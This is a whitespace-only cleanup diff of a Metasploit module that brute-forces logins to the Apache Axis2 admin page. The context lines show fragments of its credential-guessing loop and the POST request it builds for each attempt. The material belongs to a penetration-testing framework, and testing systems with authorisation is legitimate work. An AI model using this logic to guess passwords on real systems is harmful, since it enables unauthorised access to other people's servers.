@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
 		super(
 			'Name'           => 'Apache Axis2 v1.4.1 Brute Force Utility',
 			'Version'        => '$Revision$',
-			'Description'    => %q{This module attempts to login to an Apache Axis2 v1.4.1 
+			'Description'    => %q{This module attempts to login to an Apache Axis2 v1.4.1
 				instance using username and password combindations indicated by the USER_FILE,
 				PASS_FILE, and USERPASS_FILE options.},
 			'Author'         => [
@@ -33,13 +33,13 @@ class Metasploit3 < Msf::Auxiliary
 				'Leandro Oliveira <leandrofernando[at]gmail.com>'
 			],
 			'License'        => MSF_LICENSE
-		)   
+		)
 
 		register_options(
 			[ Opt::RPORT(8080),
 				OptString.new('URI', [false, 'Path to the Apache Axis Administration page', '/axis2/axis2-admin/login']),
 		], self.class)
-	end 
+	end
 
 	def target_url
 		"http://#{vhost}:#{rport}#{datastore['URI']}"
@@ -50,9 +50,9 @@ class Metasploit3 < Msf::Auxiliary
 
 		each_user_pass { |user, pass|
 			do_login(user, pass)
-		}   
+		}
 
-	end 
+	end
 
 	def do_login(user=nil,pass=nil)
 		post_data = "userName=#{Rex::Text.uri_encode(user.to_s)}&password=#{Rex::Text.uri_encode(pass.to_s)}&submit=+Login+"
@@ -76,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 					:target_port => rport,
 					:vhost  => vhost,
 					:critical => true
-				)	
+				)
 			elsif(res and res.code == 200)
 				vprint_error("#{target_url} - Apache Axis - Failed to login as '#{user}'")
 			else
